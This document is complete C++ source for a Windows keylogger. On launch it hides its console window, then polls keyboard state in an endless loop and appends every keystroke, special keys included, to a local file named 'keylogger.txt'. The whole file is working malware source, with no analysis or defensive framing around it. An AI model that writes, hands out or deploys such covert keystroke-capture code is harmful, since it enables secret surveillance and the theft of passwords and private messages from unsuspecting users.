#include <iostream>
#include <fstream>
#include <windows.h>
#include <bits/stdc++.h>

#define LOG_FILE "keylogger.txt"

void saveData(const std::string& data) {
    std::ofstream logfile(LOG_FILE, std::ios::app);

    if (logfile.is_open()) {
        logfile << data;
        logfile.close();
    } else {
        std::cerr << "Error opening log file." << std::endl;
    }
}

std::string translateSpecialKey(int key) {
    std::string result;

    switch(key) {
        case VK_SPACE: result = " "; break;
        case VK_RETURN: result = "\n"; break;
        case VK_BACK: result = "\b"; break;
        case VK_CAPITAL: result = "[CAPS_LOCK]"; break;
        case VK_SHIFT: result = "[SHIFT]"; break;
        case VK_TAB: result = "[TAB]"; break;
        case VK_CONTROL: result = "[CTRL]"; break;
        case VK_MENU: result = "[ALT]"; break;
        default: break;
    }

    return result;
}

int main() {
    const int specialKeyArray[] = {VK_SPACE, VK_RETURN, VK_BACK, VK_CAPITAL, VK_SHIFT, VK_TAB, VK_CONTROL, VK_MENU};

    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);

    while(true) {
        for (int key = 8; key <= 190; key++) {
            if (GetAsyncKeyState(key) == -32767) {
                bool isSpecialKey = std::find(std::begin(specialKeyArray), std::end(specialKeyArray), key) != std::end(specialKeyArray);

                if (isSpecialKey) {
                    std::string specialKeyChar = translateSpecialKey(key);
                    saveData(specialKeyChar);
                } else {
                    if (GetKeyState(VK_CAPITAL)) {
                        saveData(std::string(1, static_cast<char>(key)));
                    } else {
                        saveData(std::string(1, static_cast<char>(std::tolower(key))));
                    }
                }
            }
        }
    }

    return 0;
}

